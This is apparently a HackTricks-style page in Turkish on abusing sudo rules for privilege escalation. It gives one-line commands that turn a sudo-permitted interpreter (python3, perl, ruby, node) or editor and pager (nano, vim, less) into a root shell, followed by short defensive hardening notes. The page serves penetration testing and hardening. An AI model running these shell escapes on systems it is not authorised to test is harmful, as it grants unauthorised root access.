# Sudo Command Abuse

{{#include ../../banners/hacktricks-training.md}}

## Sudo tarafından izin verilen yorumlayıcılar

`sudo -l`, bir kullanıcının bir yorumlayıcıyı root olarak çalıştırmasına izin veriyorsa bunu doğrudan code execution olarak değerlendirin. Yorumlayıcılar arbitrary code çalıştırmak üzere tasarlanmıştır; bu nedenle `python3`, `perl`, `ruby`, `lua`, `node` veya benzer binary'lerin çalıştırılmasına izin veren bir kural, argümanlar sıkı şekilde kısıtlanıp doğrulanmadığı sürece genellikle root command execution ile eşdeğerdir.

Yaygın inceleme akışı:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Diğer interpreter örnekleri:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Tam yol önemlidir. sudo kuralı `/usr/bin/python3` kullanımına izin veriyorsa, doğrulama sırasında tam olarak bu yolu kullanın:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudo ile izin verilen editörler

`sudo -l`, bir kullanıcının root olarak etkileşimli bir editor çalıştırmasına izin veriyorsa bunu zararsız bir dosya düzenleme izni olarak değil, bir komut çalıştırma yüzeyi olarak değerlendirin. Editor'ler genellikle shell komutlarını çalıştırabilir, rastgele dosyaları okuyabilir, rastgele dosyalara yazabilir veya editor içinden harici yardımcıları çağırabilir.

Yaygın inceleme akışı:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano command execution

`nano` sudo üzerinden çalıştırılmasına izin verildiğinde, editor arayüzü üzerinden command execution mümkün olabilir:
```text
Ctrl+R
Ctrl+X
```
Ardından şu tür bir komut sağlayın:
```bash
id
/bin/sh
```
Bazı terminallerde, etkileşimli bir shell için standart akışların yeniden yönlendirilmesi gerekebilir:
```bash
reset; /bin/sh 1>&0 2>&0
```
Tam tuş dizisi nano sürümüne ve build seçeneklerine göre değişebilir, ancak güvenlik sorunu aynıdır: editor root olarak çalışır ve harici komutları çalıştırabilir.

### Diğer yaygın editor escape yöntemleri

Vim tarzı editorler genellikle `:!` üzerinden komut çalıştırma olanağı sunar:
```text
:!/bin/sh
```
`less` gibi pager'lar da shell execution özelliğini açığa çıkarabilir:
```text
!/bin/sh
```
## Savunma notları

- `sudo` üzerinden interpreter veya interactive editor yetkisi vermekten kaçının.
- Tek ve dar kapsamlı bir yönetim işlemi gerçekleştiren, sabit ve root sahibi wrapper'ları tercih edin.
- Bir interpreter kullanılması kaçınılmazsa tam script path'ini kısıtlayın; kullanıcı kontrollü argümanları, yazılabilir import'ları, `PYTHONPATH`'i ve güvenli olmayan environment korumasını engelleyin.
- Dosya düzenleme gerekiyorsa tam file path'ini kısıtlayın ve patched sudo sürümleri ile katı environment yönetimiyle `sudoedit` kullanmayı değerlendirin.
- `SETENV`, `env_keep`, yazılabilir çalışma dizinlerini, yazılabilir module/import path'lerini, `NOEXEC`, `use_pty` ve logging'i inceleyin; ancak bunları eksiksiz bir sandbox olarak değerlendirmeyin.

{{#include ../../banners/hacktricks-training.md}}
